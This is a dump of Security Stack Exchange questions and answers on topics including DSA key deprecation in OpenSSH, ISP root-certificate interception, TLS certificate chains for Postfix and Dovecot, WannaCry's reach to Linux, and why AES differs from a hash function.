  <li>Level 3 = 2 mm strips OR 4 x 30mm particles (Confidential)</li>
  <li>Level 4 = 2 x 15 mm particles (Commercially Sensitive)</li>
  <li>Level 5 = 0.8 x 12 mm particles (Top Secret or Classified)</li>
  <li>Level 6 = 0.8 x 4 mm particles (Top Secret or Classified)</li>
  </ul>
</blockquote>

<p>What I'm trying to say is - it's not about - ""Let's torn this paper and we'll be fine!"" It's about how hard is to put this pieces together. If it's next to impossible, then shredding is done well.
However, if attacker is aiming for the lowest hanging fruit, then any kind of shredding is better then none.</p>

<p>Example of well done shredding (once it was a money)
<img src=""https://i.stack.imgur.com/J2tAu.jpg"" alt=""enter image description here""></p>

<p>I guess setting them on fire or destroying them in chemical reaction would be the fastest, but this techniques should only be preformed in controlled environments by professionals!!!
Alternative is to decompose paper in water, however, it's pretty long process (10-14 days) and you'll need enough space and water to do so.</p>
","7102"
"Why OpenSSH deprecated DSA keys","28964","","<p>There was a question <a href=""https://security.stackexchange.com/questions/5096/rsa-vs-dsa-for-ssh-authentication-keys"">RSA vs. DSA for SSH authentication keys</a> asking which key is better. Basically all answers were more in a favour of RSA over DSA but didn't really tell that DSA would be somehow insecure.</p>

<p>Now however DSA was deprecated by OpenSSH and is later going to be entirely dropped: <a href=""https://www.gentoo.org/support/news-items/2015-08-13-openssh-weak-keys.html"" rel=""noreferrer"">https://www.gentoo.org/support/news-items/2015-08-13-openssh-weak-keys.html</a></p>

<p>The information states:</p>

<blockquote>
  <p>Starting with the 7.0 release of OpenSSH, support for ssh-dss keys has been disabled by default at runtime due to their inherit weakness.
  If you rely on these key types, you will have to take corrective
  action or risk being locked out.</p>
  
  <p>Your best option is to generate new keys using strong algos such as
  rsa or ecdsa or ed25519.  RSA keys will give you the greatest
  portability with other clients/servers while ed25519 will get you the
  best security with OpenSSH.</p>
</blockquote>

<p>What makes DSA keys inherently weak?</p>
","<p>This is a good question. The <a href=""http://www.openssh.com/legacy.html"">dedicated page</a> from OpenSSH only says:</p>

<blockquote>
  <p>OpenSSH 7.0 and greater similarly disables the ssh-dss (DSA) public key algorithm. It too is weak and we recommend against its use.</p>
</blockquote>

<p>which is no more detailed than the ""inherit weakness"" from the announce. I did not find any published explanation about these weaknesses except some unsubstantiated weaselling that talks of ""recent discoveries"". Thus, it is time for some sleuthing.</p>

<p>In the source code of OpenSSH-6.9p1 (Ubuntu 15.10 package), for the key generation tool <code>ssh-keygen</code>, I find this remarkable bit of code:</p>

<pre><code>    maxbits = (type == KEY_DSA) ?
        OPENSSL_DSA_MAX_MODULUS_BITS : OPENSSL_RSA_MAX_MODULUS_BITS;
    if (*bitsp &gt; maxbits)
            fatal(""key bits exceeds maximum %d"", maxbits);
    if (type == KEY_DSA &amp;&amp; *bitsp != 1024)
            fatal(""DSA keys must be 1024 bits"");
</code></pre>

<p>The <code>OPENSSL_DSA_MAX_MODULUS_BITS</code> is a constant from OpenSSL's headers, that define it to 10000. So the first four lines check that the requested key size, at generation time, can actually be handled by the key generation process. However, the next two lines basically say: ""regardless of the test above, if the key is DSA and the size is not 1024, niet.""</p>

<p>These 6 lines are, in themselves, a sure sign that whoever developed that code did not completely agree with himself with regards to key sizes. This code was probably assembled incrementally and possibly by different people. The source of the ""1024"" can be traced to the actual DSA standard (called ""DSS"" as ""Digital Signature Standard""), <a href=""http://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.186-4.pdf"">FIPS 186-4</a>. That standard was revised several times. In its first version, DSA was mandated to use a modulus whose size was between 512 and 1024 bits (and should be a multiple of 64, presumably to simplify the task for implementers). A later version acknowledged the increases in technological power and mathematical advances, and banned any size other than 1024 bits. The modern version of FIPS 186 (the fourth revision, as of early 2016) allows the modulus to have size 1024, 2048 or 3072 bits.</p>

<p>It can thus be surmised that <code>ssh-keygen</code> refuses to use a modulus size different from 1024 bits because someone, at some point, read the then-current FIPS 186 version that mandated exactly that, and nobody bothered to update <code>ssh-keygen</code> when the FIPS standard was amended. Regardless of how this spectacular piece of programming schizophrenia came to be, the raw result is that most if not all SSH keys of type DSA in use today rely on a 1024-bit modulus.</p>

<p>The next piece of the puzzle is the <a href=""https://weakdh.org/"">Logjam attack</a>. Logjam is basically about noticing that when a client and server agree to use weak crypto, they can be attacked. This is an attack on SSL/TLS, not SSH. However, the Logjam article does not stop at (rightfully) bashing SSL/TLS implementations for using a 512-bit modulus for DH; it also dedicates some talking space to ""state-level adversaries"". That part mostly says something which was already known, i.e. that breaking discrete logarithm modulo a 1024-bit modulus (something which would allow breaking both DH and DSA) is right now horrifyingly expensive, but not <em>impossible</em> with regards to our current knowledge of the problem and available technology (similar to breaking RSA-1024, and quite unlike breaking a 2048-bit DH or DSA, which are beyond the feasible with current Earth resources).</p>

<p>To receptive ears, this all sounded like ""OMG we are all pirated by the NSA !"" and the publicity around the Logjam issue (which is very real) trailed in its wake a substantial amount of hysteria on the subject of 1024-bit DSA keys, included when they are used in SSH.</p>

<p>An extra point was that using DSA requires generating, <em>for each signature</em>, a new random value, and the quality of the generation of that value is of paramount importance. Some implementations have failed spectacularly, leading to private key leakage (notably for some ""Bitcoin wallets""). This characteristic of DSA is shared with its elliptic-curve version ECDSA. It <a href=""http://tools.ietf.org/html/rfc6979"">can be fixed</a>. But it instilled the idea that DSA signatures can be tricky to do properly (and ECDSA signatures equally, but elliptic curves are cool and nobody wants to ban them).</p>

<p>These parameters, taken all together, explain the ban. This can be viewed as a case of OpenSSH developers being proactive in their notion of security and are ready to force users to use strong crypto. Another way of seeing the very same sequence of decisions is that OpenSSH developers blundered badly at some point because of some poor reading of FIPS 186, and then sought to cover it in the equivalent of dumping at sea the corpse of the inconvenient husband.</p>

<p>Note that breaking your DSA key would allow the attacker to impersonate you, but not to decrypt recorded sessions. While it can be said that switching to an ECDSA key would be a good idea at some point (it saves a bit of bandwidth and CPU), there is no cryptanalytic urgency to do so. You will still have to do it, because otherwise you may be locked out of your servers because some packager was too zealous in the deprecation policy.</p>
","112818"
"kadmin problem: ""Client not found in Kerberos database while initializing kadmin interface""","28924","","<p>I'm having problems setting up Single Sign On on my Mac (Snow Leopard). My program was giving the error</p>

<pre><code>accept_sec_context: Unspecified GSS failure. Minor code may provide more information: \
Key table entry not found (000d0000:96c73ab5)
</code></pre>

<p>When using the Mac built in library (<code>/usr/lib/libgssapi_krb.dylib</code>). It works fine with Likewise.</p>

<p>I'd set up an identity for myself in Ticket Viewer, and issued a ticket. I'm now trying to go through the set up process <a href=""http://web.mit.edu/kerberos/www/krb5-1.2/krb5-1.2.6/doc/install.html"" rel=""nofollow"">manually</a> from the terminal. So far so good, up until I get to the <code>Install the Slave KDCs</code> step, where I can't start kadmin. I get the following output:</p>

<pre><code>$ kadmin
Authenticating as principal me/admin@CORP.ORG with password.
kadmin: Client not found in Kerberos database while initializing kadmin interface
</code></pre>

<p>I added myself to the keytab using <code>ktadd</code> in <code>kadmin.local</code>, but this hasn't worked. I'm stumped as to how to progress from here. </p>

<h2>Update</h2>

<p>Running <code>kadmin -p me</code> prompts me for my password, but still rejects me with error:</p>

<pre><code>kadmin: Database error! Required KADM5 principal missing while initializing kadmin interface
</code></pre>
","<p>""Client not found in database"" means the principal you used, <code>me/admin</code>, does not exist.</p>

<p>""Required KADM5 principal missing"" means that your Kerberos database is missing principals for <code>kadmin/<i>fqdn.of.the.kdc</i>@CORP.ORG</code> as well as the legacy fallback <code>kadmin/admin@CORP.ORG</code>. Add them through <code>kadmin.local</code>.</p>

<p>""Missing keytab entry"" usually refers to the <em>service</em> principal on the <em>server's</em> keytab (e.g. <code>host/fqdn.of.my.server</code>).</p>
","7986"
"I can't access websites that use HTTPS, instead getting the message ""your connection is not private""!","28911","","<p>I found myself suddenly unable to access websites that use HTTPS, so I contacted my service provider, and they asked me to install a certificate in the Trusted Root Certificate Authorities store. But something isn't right: installing a certificate on every device connected to the same network just to be able to access websites that use HTTPS is just weird! How can I be sure that this certificate is issued by a trusted CA?</p>

<p>When I tried to install it, I got the following message:</p>

<blockquote>
  <p><strong>Warning:</strong> If you install this root certificate, Windows will automatically trust any certificate issued by this CA. Installing a certificate with an unconfirmed thumbprint is a security risk. If you click ""Yes"" you acknowledge this risk.</p>
</blockquote>

<p>Here is the certificate information:</p>

<ul>
<li>Version: V3</li>
<li>Serial num: 00 f8 ab 36 f3 84 31 05 39</li>
<li>Signature algo: sha1RSA</li>
<li>Signature hash algo: sha1</li>
<li>Issuer: ISSA, Internet, Internet, Beirut, Beirut, LB</li>
<li>Subject: ISSA, Internet, Internet, Beirut, Beirut, LB</li>
<li>Public Key: RSA (1024 bits)</li>
</ul>

<p>It's valid until 2019.</p>

<p>And by the way, I'm in Lebanon.</p>

<p><strong>I contacted my ISP again and they told me that they're using some kind of an accelerator to enhance the speed, and it needs authentication, so they chose to use a certificate instead of making the user enter a username and password every time they wants to access websites that use HTTPS. And they suggested that if I'm not okay with that, they would put me in a new pool. So what should I do?</strong></p>
","<p>Whilst I don't know the specifics of your ISP, I would say that it's likely that what they're doing here is intercepting all traffic you send over the Internet. In order to do that (without you getting error messages whenever you visit an HTTPS encrypted site), they would need to install a root certificate, which is what you mention in your post.</p>

<p>They need to do this as what this kind of interception usually entails is creating their own certificate for each site you visit.  so for example if you visit <a href=""https://www.amazon.com"">https://www.amazon.com</a> they need to have a certificate that your browser considers valid for that connection (which is one issued by a trusted Certificate Authority, either one provided with the browser or one you manually install).</p>

<p>From your perspective, the problem here is it means that they can see all your Internet traffic including usernames/passwords/credit card details.  So if they want to, they can look at that information.  Also if they have a security breach it's possible that other people might get access to that information.  In addition, they may also gain access to any account that you access over this Internet connection (e.g., email accounts).  Finally, installing this root certificate allows them to modify your Internet traffic without detection.</p>

<p>What I would recommend is that you query with them exactly why they need to see the details of your encrypted traffic (e.g., is this a legal requirement for your country) and if you're not 100% satisfied with the response, get a new ISP.  Another possibility is to use a VPN and tunnel all your traffic through the VPN.  If you are not happy with your ISP gaining this access to your HTTPS connections, do not install the root certificate they provided you.</p>
","80672"
"Why do browsers default to http: and not https: for typed in URLs?","28890","","<p>When I type <code>example.com</code> without any scheme into the browser bar and press Enter it is interpreted as <code>HTTP://example.com</code>, not <code>HTTPS://example.com</code>.  Why?  And where are the plans to fix this?</p>

<p>(To be clear, I'm talking <em>only</em> about typed/pasted addresses coming from a ""lazy"" user, not about software-defined actions such as following scheme-relative URLs, <code>window.location = ""url""</code> etc.  And obviously typing/pasting <code>HTTP://example.com</code> must still work.)</p>

<p><strong>EDIT</strong>: As some answers point out sites already can <em>mostly</em> achieve this with redirects + HSTS.  The central technical gain would be narrowing the first-connection problem (also addressed by HSTS preload but that can't scale to all sites).  I can see how that's a weak justification for breaking things <em>now</em>; what I'm more interested in is whether it's an obvious endgame <strong>in 5 years? 10? 20?</strong></p>

<p>I can see several problems on the way to defaulting to https interpretation:</p>

<ol>
<li><p>User experience with sites that only work over http.  Defaulting to https would show an error but the user usually has no idea whether it <em>should</em> work, i.e. whether this site simply never worked over https or is this a downgrade attack.  </p>

<p>If the error page for this situation will contain an easy ""did you mean http:...?"" link(*), users will get used to clicking that on any site that doesn't work and we haven't gained much(?).  And if it's not easy (e.g. user must edit <code>https</code>-><code>http</code>, users won't use such browser.</p>

<p><strong>EDIT</strong>: I should have clarified that the error indication must be different from explicitly going to an HTTPS address which failed — this scenario is not so much ""fail"" as ""the safe interpretation didn't work"".  And for starters, even ""soft failing"" automatically to HTTP with a warning bar on top would be OK.</p>

<p>But I think we still gain 3 things: going to unsecure site is a conscious action, we educate users that unsecure HTTP is <a href=""https://www.youtube.com/watch?v=3fU3FoMJSpw#t=44"">not normal</a>, and we put pressure on sites to implement https.</p></li>
<li><p>Inconvenience of having to type <code>http://</code> in some cases.  IMO completely outweighed by convenience of not having to type <code>https://</code> in more cases.</p></li>
<li><p>""Compatibility"" with the historical default.  I'm not sure if it's enshrined in some standard, but IMO it's clear we'll have to change it <em>some day</em>, so that's not a showstopper.</p></li>
<li><p>Politics/economics: the CA system has its issues and browsers might be reluctant to pressure site admins to pay them (if they don't otherwise see value in that).  Let's ignore money for a moment and pretend <a href=""https://letsencrypt.org/"">Let's Encrypt free CA</a> has arrived.</p></li>
</ol>

<p>I can see why making the change right now can be controversial; what baffles me is why it's not widely discussed as the obvious long-term goal, with some staged plan a-la the SHA-2 certs deprection though maybe slower.  What I see seems to assume http will remain default practically forever:</p>

<ul>
<li><p>Chrome's move to hiding <code>http://</code> in URL bar is a step back.  The first step towards https default should have been showing http in red; at some later time eventually move to hiding <code>https://</code> (only showing green padlock)... </p></li>
<li><p>HSTS moves in the right direction but with cautious per-site opt-in.  It's both weaker and stronger — sites opt in to forcing https even for explicit http urls, with no user recourse for errors — but the RFC doesn't even mention the idea that https could be a <em>global</em> default, or that browser default scheme is to blame for <a href=""https://tools.ietf.org/html/rfc6797#section-14.6"">bootsrap MITM</a> problem.</p></li>
<li><p>I've seen DNSSEC mentioned as future vector for HSTS-like opt-in but again never saw proposals for opt-out...</p></li>
</ul>

<p>Also, are there any browsers (or extensions) offering this as an option?</p>
","<p>Well, I can presume that a few reasons exist:</p>

<ol>
<li>HTTPS support is not automatically configured on websites. Therefore, why should browsers assume it is?</li>
<li>Saying that a website is not accessible unless using a specific scheme would be over the heads of a significant number of users.</li>
<li>Switching to HTTPS is not as simple as it seems in some cases. <a href=""http://nickcraver.com/blog/2013/04/23/stackoverflow-com-the-road-to-ssl/"" rel=""nofollow noreferrer"">Take Stack Exchange for example.</a></li>
</ol>

<hr>

<p>As for showing insecure websites in red, <a href=""http://www.chromium.org/Home/chromium-security/marking-http-as-non-secure"" rel=""nofollow noreferrer"">that is already in progress</a>.</p>

<p>Google Chrome has the following timeline for giving errors on insecure websites:</p>

<ol>
<li><a href=""https://security.googleblog.com/2015/10/simplifying-page-security-icon-in-chrome.html"" rel=""nofollow noreferrer"">Chrome 46</a>

<blockquote>
  <p>Chrome will mark the “HTTPS with Minor Errors” state using the same neutral page icon as HTTP pages.</p>
</blockquote></li>
<li><a href=""https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html"" rel=""nofollow noreferrer"">Chrome 56</a>

<blockquote>
  <p>mark HTTP pages that collect passwords or credit cards as non-secure</p>
</blockquote></li>
<li><a href=""https://security.googleblog.com/2017/04/next-steps-toward-more-connection.html"" rel=""nofollow noreferrer"">Chrome 62</a>

<blockquote>
  <p>Chrome will show the “Not secure” warning in two additional situations: when users enter data on an HTTP page, and on all HTTP pages visited in Incognito mode.</p>
</blockquote></li>
</ol>
","81803"
"Does Facebook store plain-text passwords?","28842","","<p>I was about to reset my Facebook password and got this error:</p>

<blockquote>
  <p>Your new password is too similar to your current password. Please try another password.</p>
</blockquote>

<p>I assumed that Facebook stores only password hashes, but if so, how can they measure passwords similarity? This should be impossible with good hashing function, right?</p>

<p>Question is - how is this possible and what are the implications?</p>

<p>Thanks in advance. </p>

<p><strong>UPDATE</strong></p>

<p>I didn't make it clear - I was not asked to provide old and new password. It was the ""reset password"" procedure, where I only provide a new password, so most of answers of <a href=""https://security.stackexchange.com/questions/3170/how-can-a-system-enforce-a-minimum-number-of-changed-characters-in-passwords-wi"">suggested duplicate</a> are not applicable.</p>

<p><strong>UPDATE2</strong></p>

<p>mystery solved - see <a href=""https://security.stackexchange.com/questions/53481/does-facebook-store-plain-text-passwords#comment84577_53483"">comment</a> (from Facebook engineer)</p>
","<p>Let's hope and assume that Facebook stores only hashes of current password (and potentially previous passwords).</p>

<p>Here is what they can do:</p>

<ol>
<li><p>user sets first password to ""first"" and fb stores hash(""first"").</p></li>
<li><p>later on, users resets password and is asked to provide new password ""First2""</p></li>
<li><p>Facebook can generate bunch of passwords (similar to the new one): [""First2"", ""fIrst2"", ""firSt2"", ... ""first2"", ... ""first"", ... ] and and then compare hash of each with the stored hash.</p></li>
</ol>

<p>This is the only solution that comes to my mind. Any other?</p>
","53483"
"TLS library problem when connecting to Dovecot","28778","","<p>I have a Comodo PositiveSSL certificate issued for <code>mail.btcontract.com</code> and I've set up Postfix and Dovecot to work with it in the following way:</p>

<p>Postfix main.cf:</p>

<pre><code>smtpd_tls_cert_file  = /etc/ssl/mail/mail_btcontract_com.crt
smtpd_tls_key_file   = /etc/ssl/mail/mail_btcontract_com.key
smtpd_tls_CAfile     = /etc/ssl/mail/AddTrustExternalCARoot.crt
smtp_tls_CAfile      = /etc/ssl/mail/AddTrustExternalCARoot.crt
</code></pre>

<p>dovecot.conf:</p>

<pre><code>ssl_cert =&lt; /etc/ssl/mail/mail_btcontract_com.pem
ssl_key  =&lt; /etc/ssl/mail/mail_btcontract_com.key
</code></pre>

<p>I've generated <code>pem</code> out of <code>crt</code> following this tutorial: <a href=""http://blog.wong42.com/2011/05/converting-a-ssl-certificate-from-crt-format-to-pem/"" rel=""nofollow noreferrer"">http://blog.wong42.com/2011/05/converting-a-ssl-certificate-from-crt-format-to-pem/</a></p>

<p>The problem is that when I try to connect to my server from a Thunderbird mail client I see the following errors:</p>

<p><img src=""https://i.stack.imgur.com/gKLQn.png"" alt=""enter image description here"">
<img src=""https://i.stack.imgur.com/ZbTKm.png"" alt=""enter image description here""></p>

<p>At the same time in <code>/var/log/mail.log</code> I see this:</p>

<pre><code>Nov 16 12:15:57 BTContractTest postfix/smtpd[22870]: connect from 51-28-134-95.pool.ukrtel.net[95.134.28.51]
Nov 16 12:15:58 BTContractTest postfix/smtpd[22870]: Anonymous TLS connection established from 51-28-134-95.pool.ukrtel.net[95.134.28.51]: TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits)
Nov 16 12:15:58 BTContractTest postfix/smtpd[22870]: warning: TLS library problem: 22870:error:14094418:SSL routines:SSL3_READ_BYTES:tlsv1 alert unknown ca:s3_pkt.c:1258:SSL alert number 48:
Nov 16 12:15:58 BTContractTest postfix/smtpd[22870]: lost connection after STARTTLS from 51-28-134-95.pool.ukrtel.net[95.134.28.51]  
</code></pre>

<p>When I try <code>openssl s_client -connect mail.btcontract.com:143 -starttls imap</code> I first see this:</p>

<pre><code>CONNECTED(00000003)
depth=0 OU = Domain Control Validated, OU = PositiveSSL, CN = mail.btcontract.com
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 OU = Domain Control Validated, OU = PositiveSSL, CN = mail.btcontract.com
verify error:num=27:certificate not trusted
verify return:1
depth=0 OU = Domain Control Validated, OU = PositiveSSL, CN = mail.btcontract.com
verify error:num=21:unable to verify the first certificate
verify return:1
</code></pre>

<p>What is going on and what should I do fix all this?<br>
Also, these are all the files I've got from certificate authority:
<img src=""https://i.stack.imgur.com/q4z5p.png"" alt=""enter image description here""></p>

<p>I don't use intermediate certs anywhere, could that be the source of problem?</p>

<p><strong>UPDATE</strong>  </p>

<p>Following Thomas Pornin's advice I did the following:</p>

<pre><code>cat mail_btcontract_com.crt COMODORSAAddTrustCA.crt COMODORSADomainValidationSecureServerCA.crt &gt; full.crt  
</code></pre>

<p>and then in Postfix main.cf:</p>

<pre><code>smtpd_tls_cert_file  = /etc/ssl/mail/full.crt
smtpd_tls_key_file   = /etc/ssl/mail/mail_btcontract_com.key
smtpd_tls_CAfile     = /etc/ssl/mail/AddTrustExternalCARoot.crt
smtp_tls_CAfile      = /etc/ssl/mail/AddTrustExternalCARoot.crt
</code></pre>

<p>dovecot.conf:</p>

<pre><code>ssl_cert =&lt; /etc/ssl/mail/full.crt
</code></pre>

<p>And now I'm getting a different error:</p>

<pre><code>Nov 16 13:28:09 BTContractTest postfix/smtpd[23921]: warning: cannot get RSA private key from file /etc/ssl/mail/mail_btcontract_com.key: disabling TLS support 
Nov 16 13:28:09 BTContractTest postfix/smtpd[23921]: warning: TLS library problem: 23921:error:0B080074:x509 certificate routines:X509_check_private_key:key values mismatch:x509_cmp.c:330:  
</code></pre>

<p>I've tried switching places of concatenated certificates and also tried to inclue root ca like this:  </p>

<pre><code>cat AddTrustExternalCARoot.crt mail_btcontract_com.crt COMODORSAAddTrustCA.crt COMODORSADomainValidationSecureServerCA.crt &gt; full.crt  
</code></pre>

<p>But no luck so far.</p>
","<p>In SSL/TLS, the server is supposed to send not only its certificate, but a complete chain that goes from the root to the server's certificate (the root itself may be omitted, but the intermediate CA should be sent). If the server does not send a complete chain, then it is up to the client to try to complete it, e.g. by downloading the missing certificate, but it is not mandatory for SSL/TLS clients to do any effort in that respect. A client may reject an incomplete chain right away.</p>

<p>The <code>smtpd_tls_cert_file</code> option should point to a file that contains the chain, i.e. all the certificates in PEM format, concatenated in the chain order (starting with the server's certificate). See <a href=""http://www.postfix.org/TLS_README.html#server_tls"" rel=""nofollow"">the documentation</a>. PEM format is the one where the certificate is encoded in Base64, with an explicit <code>-----BEGIN CERTIFICATE-----</code> header. If you have a certificate in binary format, you can convert it to PEM with:</p>

<pre><code>openssl x509 -inform DER -in cert.crt -out cert.pem
</code></pre>

<p>First open with a text editor (or a simple <code>more</code> command) the certificates you have to see if they are in binary, or already in PEM. Then concatenates the PEM certificates in a single text file, as described by the Postfix documentation.</p>
","72986"
"Does WannaCry infect Linux?","28765","","<p>After reading <a href=""https://security.stackexchange.com/questions/159331/how-is-the-wannacry-malware-spreading-and-how-should-users-defend-themselves-f"">this question</a>, now, I am wondering if <code>WannaCry</code> malware can infect Linux OS especially Ubuntu.</p>

<p>One of the answers talked about <code>SMB2</code> and windows. Does it mean a Linux based computer is safe? (Beside the side effects, Wine, and being a conveyor)  </p>
","<p>Wannacry doesn't infect Linux machines. It uses CVE-2017-0146 and CVE-2017-0147 which is the NSA leak exploit which was released by Shadow Broker almost 3 weeks ago. 
It does affect Linux machines with <code>wine</code> configured. </p>

<p>It takes advantage of an SMB exploit.</p>

<p>There are 2 paths that can help you protect yourself.</p>

<ol>
<li>Make this domain available to your environment. <code>http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</code>
The wannacry uses this to detect if the environment is running under analysis or not. This domain was a unregistered domain until researchers realized. They made it and purchased to domain to stop the spreading. 
On registering the ransomware thinks it is running under sandbox and hence stops </li>
<li>Download the patch officially release by Microsoft.
Following is the link.</li>
</ol>

<p>WannaCry:
<a href=""https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/"" rel=""nofollow noreferrer"">https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</a></p>

<p>SMB patch:
<a href=""https://technet.microsoft.com/library/security/MS17-010"" rel=""nofollow noreferrer"">https://technet.microsoft.com/library/security/MS17-010</a></p>

<p>Concluding:
WannaCry is the ransomware affects only Windows systems.</p>
","159399"
"How is OpenSSL related to OpenSSH?","28662","","<p>Is OpenSSH using OpenSSL to encrypt traffic? Or something else?</p>
","<p>OpenSSH is a <strong>program</strong> depending on OpenSSL the <strong>library</strong>, specifically OpenSSH uses the <code>libcrypto</code> part of OpenSSL.</p>
","3426"
"Why should one not use the same asymmetric key for encryption as they do for signing?","28552","","<p>In an <a href=""https://security.stackexchange.com/questions/1750/how-does-rsa-encryption-compare-to-pgp/1754#1754"">answer</a> to a question about RSA and PGP, PulpSpy noted this:</p>

<blockquote>
  <p>It is possible to generate an RSA key pair using GPG (for both encryption and signing -- you should not use the same key for both). </p>
</blockquote>

<p>What is the reasoning behind this?</p>

<p>Perhaps my understanding of public key encryption is flawed, but I thought the operations went something akin to this:</p>

<ul>
<li>When Bob wants to encrypt a message to Alice, he uses Alice's public key for the encryption.  Alice then uses her private key to decrypt the message.</li>
<li>When Alice wants to digitally sign a message to Bob, she uses her private key to sign it.  Bob then uses Alice's public key to verify the signature.</li>
</ul>

<p>Why is it important to use different keys for encryption and signing?  Would this not also mean you need to distribute two public keys to everyone with whom you wish to communicate?  I imagine this could easily lead to some amount of confusion and misuse of keys.</p>
","<p>It is mostly that the management approaches and timeframes differ for the use of signing and encryption keys.</p>

<p>For non-repudiation, you never want someone else to get control to your signing key since they could impersonate you.  But your workplace may want to escrow your encryption key so that others who need to can get to the information you've encrypted.</p>

<p>You also may want a signing key to be valid for a long time so people around the world can check signatures from the past, but with an encryption key, you often want to roll it over sooner, and be able to revoke old ones without as many hassles.</p>
","1807"
"Why AES is not used for secure hashing, instead of SHA-x?","28504","","<p>As far as I understand, AES is believed to be extremely secure. (I have read somewhere that it would certainly not be broken in the next 20 years, but I am still not sure if the author was serious.)</p>

<p>DES is still not so bad for an old cypher, and 3DES is still used (maybe not so much, but at least I see 3DES in about:config in Firefox).</p>

<p>It looks like (good) block cyphers are trusted by the crypto community.</p>

<p>OTOH, many problems with cryptographic hash functions are discovered.</p>

<p>From the point of view of the non-crypto-specialist: <strong>hashing functions and symmetric cyphers are the really same thing: a ""random"" function</strong> (with different inputs and output).</p>

<p>So, why not use just AES for hashing? This seems the obvious things to do to get the strong safety of AES for hashing. As a bonus, could hardware implementations of AES help?</p>

<p>Is there a simple explanation of the real difference between hash functions and symmetric cyphers?</p>
","<p>A block cipher has a key; the secrecy of the key is what the cipher security builds on. On the other hand, a hash function has no key at all, and there is no ""secret data"" on which security of the hash function is to be built.</p>

<p>A block cipher is <em>reversible</em>: if you know the key, you can decrypt what was encrypted. Technically, for a given key, a block cipher is a <em>permutation</em> of the space of possible block values. Hash functions are meant to be non-reversible, and they are not permutations in any way.</p>

<p>A block cipher operates on fixed-sized blocks (128-bit blocks for AES), both for input and output. A hash function has a fixed-sized output, but should accept arbitrarily large inputs.</p>

<p>So block ciphers and hash functions are really different animals; rather than trying to differentiate them, it is easier to see what they have in common: namely, that the people who know how to design a block cipher are also reasonably good at designing hash functions, because the analysis mathematical tools are similar (quite a lot of linear algebra and boolean functions, really).</p>

<p>Let's go for more formal definitions:</p>

<p>A <strong>block cipher</strong> is a family of permutations selected by a key. We consider the space <em>B</em> of <em>n</em>-bit blocks for some fixed value of <em>n</em>; the size of <em>B</em> is then <em>2<sup>n</sup></em>. Keys are values from a space <em>K</em>, usually another space of sequences of <em>m</em> bits (<em>m</em> is not necessarily equal to <em>n</em>). A key <em>k</em> selects a permutation among the <em>2<sup>n</sup>!</em> possible permutations of <em>B</em>.</p>

<p>A block cipher is deemed secure as long as it is computationally indistinguishable from a permutation which has been chosen uniformly and randomly among the <em>2<sup>n</sup>!</em> possible permutations. To model that, imagine a situation where an attacker is given access to two black box, one implementing the block cipher with a key that the attacker does not know, and the other being a truly random permutation. The goal of the attacker is to tell which is which. He can have each box encrypt or decrypt whatever data he wishes. On possible attack is to try all possible keys (there are <em>2<sup>m</sup></em> such keys) only one is found, which yields the same values than one of the boxes; this has average cost <em>2<sup>m-1</sup></em> invocations of the cipher. A <em>secure</em> block cipher is one such that this generic attack is the best possible attack.</p>

<p>The AES is defined over 128-bit blocks (<em>n</em> = 128) and 128-, 192- and 256-bit keys.</p>

<p>A <strong>hash function</strong> is a single, fully defined, computable function which takes as input bit sequences of arbitrary length, and outputs values of a fixed length <em>r</em> (e.g. <em>r</em> = 256 bits for SHA-256). There is no key, no family of function, just a unique function which anybody can compute.</p>

<p>A hash function <em>h</em> is deemed secure if:</p>

<ul>
<li>It is computationally infeasible to find preimages: given a <em>r</em>-bit value <em>x</em>, it is not feasible to find <em>m</em> such that <em>h(m) = x</em>.</li>
<li>It is computationally infeasible to find second preimages: given <em>m</em>, it is not feasible to find <em>m'</em> distinct from <em>m</em>, such that <em>h(m) = h(m')</em>.</li>
<li>It is computationally infeasible to find collisions: it is not feasible to find <em>m</em> and <em>m'</em>, distinct from each other, such that <em>h(m) = h(m')</em>.</li>
</ul>

<p>There are generic attacks which can find preimages, second preimages or collisions, with costs, respectively, <em>2<sup>r</sup></em>, <em>2<sup>r</sup></em>, and <em>2<sup>r/2</sup></em>. So actual security can be reached only if <em>r</em> is large enough so that <em>2<sup>r/2</sup></em> is an overwhelmingly huge cost. In practice, this means that <em>r</em> = 128 (a 128-bit hash function such as MD5) is <em>not enough</em>.</p>

<p>In an informal way, it is good if the hash function ""looks like"" it has been chosen randomly and uniformly among the possible functions which accept the same inputs. But this is an ill-defined property since we are talking about a unique function (probabilities are always implicitly about averages and repeated experiences; you cannot really have probabilities with one single function). Also, being a random function is not exactly the same as being resistant to collisions and preimages; this is the debate over the <a href=""https://crypto.stackexchange.com/questions/879/what-is-the-random-oracle-model-and-why-is-it-controversial"">Random Oracle Model</a>.</p>

<hr />

<p>Nevertheless, it is possible to build a hash function out of a block cipher. This is what the <a href=""http://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction"" rel=""nofollow noreferrer"">Merkle-Damgård</a> construction does. This entails using the input message as the <em>key</em> of the block cipher; so the block cipher is not used at all as it was meant to be. With AES, this proves disappointing:</p>

<ul>
<li>It results in a hash function with a 128-bit output, which is too small for security against technology available in 2011.</li>
<li>The security of the hash function then relies on the absence of <a href=""http://en.wikipedia.org/wiki/Related-key_attack"" rel=""nofollow noreferrer"">related-key attacks</a> on the block cipher. Related-key attacks do not really have any practical significance on a block cipher when used for encryption; hence, AES was not designed to resist such attacks, and, indeed, AES <em>has</em> a <a href=""http://www.impic.org/papers/Aes-192-256.pdf"" rel=""nofollow noreferrer"">few weaknesses</a> in that respect -- not a worry for encryption, but a big worry if AES is to be used in a Merkle-Damgård construction.</li>
<li>The performance will not be good.</li>
</ul>

<p>The <a href=""http://www.larc.usp.br/~pbarreto/WhirlpoolPage.html"" rel=""nofollow noreferrer"">Whirlpool</a> hash function is a design which builds on a block cipher <em>inspired</em> from the AES -- not the real one. That block cipher has a much improved (and heavier) key schedule, which resists related-key attacks and makes it usable as the core of a hash function. Also, that block cipher works on 512-bit blocks, not 128-bit blocks. Whirlpool is believed secure. Whirlpool is known to be very slow, so nobody uses it.</p>

